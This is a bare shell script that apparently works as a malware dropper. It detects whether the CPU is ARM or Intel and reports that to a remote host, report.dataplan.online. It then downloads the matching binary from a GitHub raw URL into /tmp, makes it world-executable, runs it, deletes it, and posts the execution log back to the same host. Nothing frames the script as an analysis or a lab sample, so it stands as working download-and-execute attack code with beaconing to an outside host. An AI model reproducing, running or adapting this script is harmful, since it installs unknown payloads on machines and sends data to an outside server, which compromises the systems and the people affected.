#!/bin/sh

report_url="http://report.dataplan.online:19188/9024134B28978B68666E2B034E46130E/debug"
arm_url="https://raw.githubusercontent.com/gptloveyou/learn/main/armv5.bin"
intel_url="https://raw.githubusercontent.com/gptloveyou/learn/main/i386.bin"
pl_url=$intel_url;
arch=`cat /proc/cpuinfo|grep -i -c ARM`
echo $arch
if [ $arch != 0 ];then
    pl_url=$arm_url
    curl -X POST $report_url -d "ARM"
else 
    pl_url=$intel_url
    curl -X POST $report_url -d "NotARM"
fi
curl -s -o /tmp/run85757.bin $pl_url 1>/tmp/tmplog0920.log 2>&1
chmod 777 /tmp/run85757.bin 1>>/tmp/tmplog0920.log 2>&1
/tmp/run85757.bin 1>>/tmp/tmplog0920.log 2>&1
rm /tmp/run85757.bin
curl -X POST $report_url -d @/tmp/tmplog0920.log
rm /tmp/tmplog0920.log
